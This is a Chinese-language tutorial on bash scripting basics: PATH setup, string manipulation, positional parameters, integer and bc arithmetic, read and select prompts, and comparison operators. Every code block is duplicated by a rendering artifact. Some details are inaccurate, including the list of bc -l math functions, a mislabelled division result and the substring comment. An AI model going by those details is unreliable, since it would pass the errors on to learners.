src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127015531.jpg" alt="Pasted-image-20241127015531"></p><h3 id="脚本解释器"><a href="#脚本解释器" class="headerlink" title="脚本解释器"></a>脚本解释器</h3><blockquote><p>都知道Windows下的bat脚本的解释器是CMD，那么Liunx下的脚本解释器都有什么呢？默认情况下为&#x2F;bin目录下的<code>bash</code>、<code>sh</code>、<code>dash</code></p></blockquote><ul><li>具体选择那个都可以，也可以注意到<code>sh</code>的就解释器是软链接到<code>dash</code>的<br><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127021012.jpg" alt="Pasted-image-20241127021012"></li></ul><ol start="2"><li>在脚本执行的开头指定解释器</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出</span></span><br><span class="line">echo $box</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">尝试设置一个变量</span></span><br><span class="line">box=v50</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出</span></span><br><span class="line">echo $box</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="系统变量和字符串"><a href="#系统变量和字符串" class="headerlink" title="系统变量和字符串"></a>系统变量和字符串</h2><h3 id="系统变量path"><a href="#系统变量path" class="headerlink" title="系统变量path"></a>系统变量path</h3><blockquote><p>Liunx和windows系统中都有个全局系统变量名为<code>path</code>，里面存放了可执行文件的搜索路径，多个路径用 <code>:</code> 分隔。</p></blockquote><ul><li>如果你想将脚本文件可以在系统的各个位置都可以执行话则需要将脚本的路径添加到<code>path</code>中</li></ul><ol><li>临时添加</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#还记得:$PATH表示保留原有的格式</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/root:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#还记得:$PATH表示保留原有的格式</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/root:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127023941.jpg" alt="Pasted-image-20241127023941"><br>2. 永久添加(在原本的基础上添加，或者将脚本移动到他变量的路经(不建议))</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这里的$PATH指引用他原本的变量，使用单引号是不解释他变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PATH:/root&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#这里的$PATH指引用他原本的变量，使用单引号是不解释他变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=&quot;$PATH:/root&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241127105714.jpg" alt="Pasted-image-20241127105714"></p><h3 id="字符串的概念"><a href="#字符串的概念" class="headerlink" title="字符串的概念"></a>字符串的概念</h3><blockquote><p><strong>字符组成的有序序列</strong>的一种变量数据类型，用于表示文本数据。字符串可以包含<strong>字母、数字、空格、符号</strong>以及其他字符，例如标点符号、特殊符号等。</p></blockquote><h4 id="字符串的定义"><a href="#字符串的定义" class="headerlink" title="字符串的定义"></a>字符串的定义</h4><ul><li>字符串可以受用单双引号或者无引号包裹，建议使用引号来避免歧义</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#其实就是一种类型，只不过使用引号包裹,不仅限于设置变量为字符串，输出的内容也可以为字符串</span></span><br><span class="line">str=<span class="string">&quot;v50&quot;</span></span><br><span class="line"><span class="comment">#但是字符串和变量不是一个道理，输出的变量内容为字符串，但不能为理解为输出字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#其实就是一种类型，只不过使用引号包裹,不仅限于设置变量为字符串，输出的内容也可以为字符串</span></span><br><span class="line">str=<span class="string">&quot;v50&quot;</span></span><br><span class="line"><span class="comment">#但是字符串和变量不是一个道理，输出的变量内容为字符串，但不能为理解为输出字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$str</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128020433.jpg" alt="Pasted-image-20241128020433"></p><h4 id="字符串的操作"><a href="#字符串的操作" class="headerlink" title="字符串的操作"></a>字符串的操作</h4><ol><li>输出多个字符串拼接</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;v50&quot;</span></span><br><span class="line">rts=<span class="string">&quot;kfc&quot;</span></span><br><span class="line"><span class="comment">#为什么这里使用了花括号————避免引用变量产生歧义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;rts&#125;</span>到了<span class="variable">$str</span></span><br><span class="line">```bash</span><br><span class="line">str=<span class="string">&quot;v50&quot;</span></span><br><span class="line">rts=<span class="string">&quot;kfc&quot;</span></span><br><span class="line"><span class="comment">#为什么这里使用了花括号————避免引用变量产生歧义</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;rts&#125;</span>到了<span class="variable">$str</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128021040.jpg" alt="Pasted-image-20241128021040"><br>2. 获取字符串长度</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;Linux&quot;</span></span><br><span class="line"><span class="comment"># 输出：长度是：5</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;长度是：<span class="variable">$&#123;#str&#125;</span>&quot;</span>  </span><br><span class="line">```bash</span><br><span class="line">str=<span class="string">&quot;Linux&quot;</span></span><br><span class="line"><span class="comment"># 输出：长度是：5</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;长度是：<span class="variable">$&#123;#str&#125;</span>&quot;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128021254.jpg" alt="Pasted-image-20241128021254"><br>3. 截取子字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;Shell scripting is fun&quot;</span></span><br><span class="line"><span class="comment"># 输出：scripting,从0开始数第六个截取到第九个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str:6:9&#125;</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line">str=<span class="string">&quot;Shell scripting is fun&quot;</span></span><br><span class="line"><span class="comment"># 输出：scripting,从0开始数第六个截取到第九个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str:6:9&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128021516.jpg" alt="Pasted-image-20241128021516"><br>4. 查找和替换</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;I love Linux&quot;</span></span><br><span class="line"><span class="comment">#在变量str里面找Liunx替换为Unix</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str/Linux/Unix&#125;</span>&quot;</span>   </span><br><span class="line">```bash</span><br><span class="line">str=<span class="string">&quot;I love Linux&quot;</span></span><br><span class="line"><span class="comment">#在变量str里面找Liunx替换为Unix</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;str/Linux/Unix&#125;</span>&quot;</span>   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128021756.jpg" alt="Pasted-image-20241128021756"></p><h2 id="传参和数值运算"><a href="#传参和数值运算" class="headerlink" title="传参和数值运算"></a>传参和数值运算</h2><h3 id="传参的基本概念"><a href="#传参的基本概念" class="headerlink" title="传参的基本概念"></a>传参的基本概念</h3><blockquote><p>可以让脚本更加灵活地处理外部输入。通过<strong>位置参数</strong>来接收传递给脚本的参数。</p></blockquote><h4 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h4><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code></td><td>脚本的名称</td></tr><tr><td><code>$1</code></td><td>传递给脚本的第1个参数</td></tr><tr><td><code>$2</code></td><td>传递给脚本的第2个参数</td></tr><tr><td><code>$3</code></td><td>传递给脚本的第3个参数</td></tr><tr><td><code>...</code></td><td>以此类推，表示传递给脚本的更多参数</td></tr><tr><td><code>$#</code></td><td>传递给脚本的参数总数</td></tr><tr><td><code>$@</code></td><td>所有的参数，参数之间用空格分隔</td></tr><tr><td><code>$*</code></td><td>所有的参数，参数之间也用空格分隔（和<code>$@</code> 类似，稍有区别）</td></tr><tr><td><code>&quot;$@&quot;</code></td><td>每个参数独立，逐行输出</td></tr><tr><td><code>&quot;$*&quot;</code></td><td>每个参数为一个整体，横向输出</td></tr><tr><td><code>$?</code></td><td>上一条命令的退出状态码</td></tr><tr><td><code>$$</code></td><td>当前的运行进程ID</td></tr></tbody></table><h4 id="传参测试"><a href="#传参测试" class="headerlink" title="传参测试"></a>传参测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名称: <span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数: <span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数: <span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数（\$@）: <span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数（\$*）: $*&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数总数: <span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;命令的退出状态：$?&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;命令的退出进程：$$&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;脚本名称: <span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第一个参数: <span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;第二个参数: <span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数（\$@）: <span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;所有参数（\$*）: $*&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;参数总数: <span class="variable">$#</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;命令的退出状态：$?&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;命令的退出进程：$$&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128024610.jpg" alt="Pasted-image-20241128024610"></p><h3 id="数值运算"><a href="#数值运算" class="headerlink" title="数值运算"></a>数值运算</h3><h4 id="变量的算数运算"><a href="#变量的算数运算" class="headerlink" title="变量的算数运算"></a>变量的算数运算</h4><ol><li>使用<code>$(( ))</code>进行一个简单的运算，例子使用变量进行，实际上能直接套数值</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=8</span><br><span class="line">b=9</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加法</span></span><br><span class="line"><span class="built_in">sum</span>=$((a + b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;加法：<span class="variable">$a</span> + <span class="variable">$b</span> = <span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 减法</span></span><br><span class="line">diff=$((a - b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;减法：<span class="variable">$a</span> - <span class="variable">$b</span> = <span class="variable">$diff</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法</span></span><br><span class="line">product=$((a * b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法：<span class="variable">$a</span> * <span class="variable">$b</span> = <span class="variable">$product</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法</span></span><br><span class="line">quotient=$((a / b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;除法：<span class="variable">$a</span> / <span class="variable">$b</span> = <span class="variable">$quotient</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取余</span></span><br><span class="line">remainder=$((a % b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取余：<span class="variable">$a</span> % <span class="variable">$b</span> = <span class="variable">$remainder</span>&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=8</span><br><span class="line">b=9</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加法</span></span><br><span class="line"><span class="built_in">sum</span>=$((a + b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;加法：<span class="variable">$a</span> + <span class="variable">$b</span> = <span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 减法</span></span><br><span class="line">diff=$((a - b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;减法：<span class="variable">$a</span> - <span class="variable">$b</span> = <span class="variable">$diff</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法</span></span><br><span class="line">product=$((a * b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法：<span class="variable">$a</span> * <span class="variable">$b</span> = <span class="variable">$product</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法</span></span><br><span class="line">quotient=$((a / b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;除法：<span class="variable">$a</span> / <span class="variable">$b</span> = <span class="variable">$quotient</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取余</span></span><br><span class="line">remainder=$((a % b))</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取余：<span class="variable">$a</span> % <span class="variable">$b</span> = <span class="variable">$remainder</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128025710.jpg" alt="Pasted-image-20241128025710"></p><ol start="2"><li>使用 <code>expr</code> 进行算术运算，例子使用变量进行，实际上能直接套数值<ul><li>运算需要使用空格，且需要对运算符进行转义。</li></ul></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line">b=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加法</span></span><br><span class="line"><span class="built_in">sum</span>=$(<span class="built_in">expr</span> <span class="variable">$a</span> + <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;加法：<span class="variable">$a</span> + <span class="variable">$b</span> = <span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 减法</span></span><br><span class="line">diff=$(<span class="built_in">expr</span> <span class="variable">$a</span> - <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;减法：<span class="variable">$a</span> - <span class="variable">$b</span> = <span class="variable">$diff</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法（*为通配符，需要使用反斜杠转义）</span></span><br><span class="line">product=$(<span class="built_in">expr</span> <span class="variable">$a</span> \* <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法：<span class="variable">$a</span> * <span class="variable">$b</span> = <span class="variable">$product</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法</span></span><br><span class="line">quotient=$(<span class="built_in">expr</span> <span class="variable">$a</span> / <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;除法：<span class="variable">$a</span> / <span class="variable">$b</span> = <span class="variable">$quotient</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取余</span></span><br><span class="line">remainder=$(<span class="built_in">expr</span> <span class="variable">$a</span> % <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取余：<span class="variable">$a</span> % <span class="variable">$b</span> = <span class="variable">$remainder</span>&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line">b=3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加法</span></span><br><span class="line"><span class="built_in">sum</span>=$(<span class="built_in">expr</span> <span class="variable">$a</span> + <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;加法：<span class="variable">$a</span> + <span class="variable">$b</span> = <span class="variable">$sum</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 减法</span></span><br><span class="line">diff=$(<span class="built_in">expr</span> <span class="variable">$a</span> - <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;减法：<span class="variable">$a</span> - <span class="variable">$b</span> = <span class="variable">$diff</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 乘法（*为通配符，需要使用反斜杠转义）</span></span><br><span class="line">product=$(<span class="built_in">expr</span> <span class="variable">$a</span> \* <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;乘法：<span class="variable">$a</span> * <span class="variable">$b</span> = <span class="variable">$product</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 除法</span></span><br><span class="line">quotient=$(<span class="built_in">expr</span> <span class="variable">$a</span> / <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;除法：<span class="variable">$a</span> / <span class="variable">$b</span> = <span class="variable">$quotient</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取余</span></span><br><span class="line">remainder=$(<span class="built_in">expr</span> <span class="variable">$a</span> % <span class="variable">$b</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;取余：<span class="variable">$a</span> % <span class="variable">$b</span> = <span class="variable">$remainder</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128030401.jpg" alt="Pasted-image-20241128030401"></p><h4 id="扩展运算"><a href="#扩展运算" class="headerlink" title="扩展运算"></a>扩展运算</h4><ul><li>shell计算中默认只能整数，可配合<code>bc</code>来进行浮点运算语法：<code>echo &quot;表达式&quot; | bc</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浮动点数除法，scale为设置小数点后几位</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 5 / 2&quot;</span> | bc)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;浮动点数除法：5 / 5 = <span class="variable">$result</span>&quot;</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浮动点数除法，scale为设置小数点后几位</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 5 / 2&quot;</span> | bc)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;浮动点数除法：5 / 5 = <span class="variable">$result</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128030654.jpg" alt="Pasted-image-20241128030654"></p><ul><li>配合<code>bc</code>的<code>-l</code>数学库参数来进行得出算数平方根<code>sqrt</code>、正弦<code>s</code>、余弦<code>c</code>、反正弦<code>a</code>、对数<code>l</code>、次方<code>e</code>、正切<code>j</code>、反余弦<code>f</code>、反正切<code>p</code>、x^y次方<code>x^y</code>、圆周率<code>PI</code></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 浮动点数除法，scale为设置小数点后几位,sqrt为计算平方根</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2;sqrt(64)&quot;</span>| bc -l)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;64的算数平方根为<span class="variable">$result</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 浮动点数除法，scale为设置小数点后几位,sqrt为计算平方根</span></span><br><span class="line">result=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2;sqrt(64)&quot;</span>| bc -l)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;64的算数平方根为<span class="variable">$result</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128031235.jpg" alt="Pasted-image-20241128031235"></p><ul><li>配合<code>bc</code>的<code>-q</code>参数运算后不显示提示符，即运算后不弹窗</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;scale=2; 5/7&quot;</span> | bc -q</span><br><span class="line">```bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;scale=2; 5/7&quot;</span> | bc -q</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="用户交互与关系运算符"><a href="#用户交互与关系运算符" class="headerlink" title="用户交互与关系运算符"></a>用户交互与关系运算符</h2><h3 id="用户交互"><a href="#用户交互" class="headerlink" title="用户交互"></a>用户交互</h3><blockquote><p>意味可以过脚本与用户进行输入和输出的交互。通过提示用户输入信息，并根据用户输入执行相应的操作。</p></blockquote><h4 id="基本交互"><a href="#基本交互" class="headerlink" title="基本交互"></a>基本交互</h4><ul><li>通过<code>read</code>命令来获取用户输入的参数，如读取多个变量则需要使用空格来分隔</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;请输入你的名字和年龄：&quot;</span></span><br><span class="line"><span class="comment">#依次将输入的内容赋值给变量</span></span><br><span class="line"><span class="built_in">read</span> name age</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你的名字是：<span class="variable">$name</span>，年龄是：<span class="variable">$age</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;请输入你的名字和年龄：&quot;</span></span><br><span class="line"><span class="comment">#依次将输入的内容赋值给变量</span></span><br><span class="line"><span class="built_in">read</span> name age</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你的名字是：<span class="variable">$name</span>，年龄是：<span class="variable">$age</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128033911.jpg" alt="Pasted-image-20241128033911"></p><h4 id="提示交互"><a href="#提示交互" class="headerlink" title="提示交互"></a>提示交互</h4><ul><li>通过<code>read</code>命令来获取用户输入的参数<code>-p</code>来提供输入前的提示信息</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的年龄：&quot;</span> age</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你的名字是：<span class="variable">$name</span>，年龄是：<span class="variable">$age</span>&quot;</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的名字：&quot;</span> name</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;请输入你的年龄：&quot;</span> age</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你的名字是：<span class="variable">$name</span>，年龄是：<span class="variable">$age</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128034215.jpg" alt="Pasted-image-20241128034215"></p><h4 id="read全部参数"><a href="#read全部参数" class="headerlink" title="read全部参数"></a>read全部参数</h4><blockquote><p>不同参数之间可以配合使用，例如设置隐藏输入内容和提示信息可以使用<code>-ps</code></p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-p</code></td><td>提示用户输入，后面跟提示信息。</td></tr><tr><td><code>-s</code></td><td>隐藏输入内容（常用于输入密码）。</td></tr><tr><td><code>-t</code></td><td>设置超时，单位为秒，超时后返回非零值。</td></tr><tr><td><code>-i</code></td><td>设置默认值，如果用户没有输入，则使用默认值。</td></tr><tr><td><code>-r</code></td><td>不处理反斜杠（\）转义字符，输入会原样保存。</td></tr><tr><td><code>-a</code></td><td>将输入保存为数组，按空格或换行分割。</td></tr><tr><td><code>-n</code></td><td>读取指定的字符数，限制用户输入的字符长度。</td></tr></tbody></table><h4 id="菜单交互"><a href="#菜单交互" class="headerlink" title="菜单交互"></a>菜单交互</h4><ul><li>基本语法</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> variable <span class="keyword">in</span> option1 option2 option3 ...; <span class="keyword">do</span></span><br><span class="line">  <span class="comment"># 对应的操作</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="keyword">select</span> variable <span class="keyword">in</span> option1 option2 option3 ...; <span class="keyword">do</span></span><br><span class="line">  <span class="comment"># 对应的操作</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>简单的操作，无退出操作只能通过ctrl+c退出</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你要吃什么&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;白米饭&quot;</span> <span class="string">&quot;红米饭&quot;</span> <span class="string">&quot;叉烧饭&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你选择了<span class="variable">$option</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示菜单</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你要吃什么&quot;</span></span><br><span class="line"><span class="keyword">select</span> option <span class="keyword">in</span> <span class="string">&quot;白米饭&quot;</span> <span class="string">&quot;红米饭&quot;</span> <span class="string">&quot;叉烧饭&quot;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;你选择了<span class="variable">$option</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://imges.xenon.us.kg/20241205/Pasted-image-20241128035659.jpg" alt="Pasted-image-20241128035659"></p><h3 id="关系逻辑运算"><a href="#关系逻辑运算" class="headerlink" title="关系逻辑运算"></a>关系逻辑运算</h3><h4 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h4><p>用于比较两个整数值的大小和相等关系。</p><table><thead><tr><th>运算符</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>-eq</code></td><td>等于（equal）</td><td><code>a -eq b</code>：a 等于 b</td></tr><tr><td><code>-ne</code></td><td>不等于（not equal）</td><td><code>a -ne b</code>：a 不等于 b</td></tr><tr><td><code>-gt</code></td><td>大于（greater than）</td><td><code>a -gt b</code>：a 大于 b</td></tr><tr><td><code>-lt</code></td><td>小于（less than）</td><td><code>a -lt b</code>：a 小于 b</td></tr><tr><td><code>-ge</code></td><td>大于或等于（greater than or equal）</td><td><code>a -ge b</code>：a 大于或等于 b</td></tr><tr><td><code>-le</code></td><td>小于或等于（less than or equal）</td><td><code>a -le b</code>：a 小于或等于 